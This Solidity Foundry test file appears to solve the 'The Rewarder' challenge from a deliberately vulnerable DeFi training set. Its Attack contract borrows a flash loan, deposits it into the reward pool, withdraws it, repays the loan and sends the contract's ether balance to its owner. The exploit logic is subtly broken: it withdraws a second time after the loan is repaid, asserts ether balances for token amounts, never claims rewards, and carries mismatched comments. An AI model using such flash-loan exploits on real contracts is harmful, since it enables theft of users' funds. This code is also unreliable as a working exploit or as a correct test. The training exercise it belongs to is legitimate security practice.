// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../src/contracts/TheRewarderPool.sol";
import "../src/contracts/FlashLoanerPool.sol";

contract TheRewarderPoolExploits is Test {
    // using Address for address payable;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    address flashLoaner = makeAddr("flashLoaner");

    uint256 constant AMOUNT_TO_DEPOSIT = 5;
    uint256 constant FLASH_LOAN_POOL_AMOUNT = 100_000_000;

    TheRewarderPool rewarderPool;
    DamnValuableToken token;
    FlashLoanerPool flashLoanPool;

    // Attack attack;

    constructor() {
        // Initialize Token
        token = new DamnValuableToken();

        // Initialize Rewarder Pool
        rewarderPool = new TheRewarderPool(address(token));

        // Initialize Flash Loan Pool
        flashLoanPool = new FlashLoanerPool(address(token));
        deal(address(token), flashLoaner, FLASH_LOAN_POOL_AMOUNT);
        vm.startPrank(flashLoaner);
        token.approve(address(flashLoanPool), FLASH_LOAN_POOL_AMOUNT);
        token.transfer(address(flashLoanPool), FLASH_LOAN_POOL_AMOUNT);

        // Deal to victm
        deal(address(token), victim, AMOUNT_TO_DEPOSIT);
    }

    function testHappyPath() external {
        vm.startPrank(victim);

        // Deposit
        token.approve(address(rewarderPool), AMOUNT_TO_DEPOSIT);
        rewarderPool.deposit(AMOUNT_TO_DEPOSIT);

        // Withdraw
        rewarderPool.withdraw(AMOUNT_TO_DEPOSIT);
    }

    function testAttack() external {
        vm.startPrank(attacker);

        Attack attack = new Attack(rewarderPool, flashLoanPool, token);
        attack.attack(AMOUNT_TO_DEPOSIT);
        attack.withdraw();

        assertEq(address(attacker).balance, AMOUNT_TO_DEPOSIT);
        assertEq(address(rewarderPool).balance, 0);
    }
}

contract Attack {
    using Address for address payable;

    TheRewarderPool rewarderPool;
    FlashLoanerPool flashLoanPool;
    DamnValuableToken token;
    address owner;

    constructor(
        TheRewarderPool _rewarderPool,
        FlashLoanerPool _flashLoanPool,
        DamnValuableToken _token
    ) {
        // Initialize rewarderPool with 1000 ether
        rewarderPool = _rewarderPool;
        flashLoanPool = _flashLoanPool;
        token = _token;

        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
        rewarderPool.withdraw(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        rewarderPool.withdraw(amount);

        token.approve(address(flashLoanPool), amount);
        token.transfer(address(flashLoanPool), amount);
    }

    function withdraw() external {
        if (msg.sender == owner) {
            payable(address(msg.sender)).sendValue(address(this).balance);
        }
    }
}
